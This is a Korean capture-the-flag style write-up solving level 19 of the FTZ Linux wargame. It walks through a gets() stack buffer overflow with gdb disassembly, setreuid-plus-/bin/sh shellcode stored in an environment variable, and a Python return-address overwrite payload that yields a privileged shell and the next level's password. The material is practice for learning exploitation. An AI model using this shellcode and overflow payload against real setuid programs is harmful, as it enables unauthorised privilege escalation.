# **FTZ LEVEL19**

## <img src="http://freevector.co/wp-content/uploads/2014/07/61901-door-key.png" width="25"> **Keys**
>attackme.c
```c
main()
{ char buf[20];
  gets(buf);
  printf("%s\n",buf);
}
```
그 전까지는 c 코드에서 권한 상승을 `setreuid`를 해주었다. 하지만 이 코드에는 권한상승이 없다. 여태까지 사용했던 쉘코드는 단순히 `/bin/sh` 명령어를 실행시켜주는 것 이였으므로 `setreuid` + `/bin/sh` 를 해주는 `shellcode`  를 사용하겠다.

사용한 `shellcode``는 이것이다.
>shellcode ( "/bin/sh" + "setreuid" )
```
\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80
```
`shellcode` 를 환경변수에 올린 다음 주소로 ret를 덮겠다. ( [환경변수 이용하기](https://github.com/papico0306/SystemHackingPractice/blob/master/FTZ_Solve/ftz11_solve.md "환경변수 이용하기") )
```
[level19@ftz level19]$ /tmp/ge EGG
EGG=0xbffffc2d
```

gdb로 분석하면
```
(gdb) disas main
Dump of assembler code for function main:
0x08048440 <main+0>:	push   ebp
0x08048441 <main+1>:	mov    ebp,esp
0x08048443 <main+3>:	sub    esp,0x28
0x08048446 <main+6>:	sub    esp,0xc
0x08048449 <main+9>:	lea    eax,[ebp-40]
0x0804844c <main+12>:	push   eax
0x0804844d <main+13>:	call   0x80482f4 <gets>
0x08048452 <main+18>:	add    esp,0x10
0x08048455 <main+21>:	sub    esp,0x8
0x08048458 <main+24>:	lea    eax,[ebp-40]
0x0804845b <main+27>:	push   eax
0x0804845c <main+28>:	push   0x80484d8
0x08048461 <main+33>:	call   0x8048324 <printf>
0x08048466 <main+38>:	add    esp,0x10
0x08048469 <main+41>:	leave  
0x0804846a <main+42>:	ret    
0x0804846b <main+43>:	nop    
0x0804846c <main+44>:	nop    
0x0804846d <main+45>:	nop    
0x0804846e <main+46>:	nop    
0x0804846f <main+47>:	nop    
End of assembler dump.
```
`buf` 의 위치가 `ebp-40` 이라는 것을 알았다.

## <img src="https://pngimg.com/uploads/road/road_PNG24.png" width="25"> **Payload**
>메모리 구조
```
| buf[40] | sfp[4] | ret[4] |
```

>Payload
```
(python -c "print 'A'*44+'\x2d\xfc\xff\xbf'";cat) | ./attackme 
```

## <img src="https://maxcdn.icons8.com/windows8/PNG/512/Military/sword-512.png" width="25"> **Attack**
```
[level19@ftz level19]$ (python -c "print 'A'*44+'\x2d\xfc\xff\xbf'";cat) | ./attackme 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-?
my-pass
TERM environment variable not set.

Level20 Password is "~~~~~~~~~".
```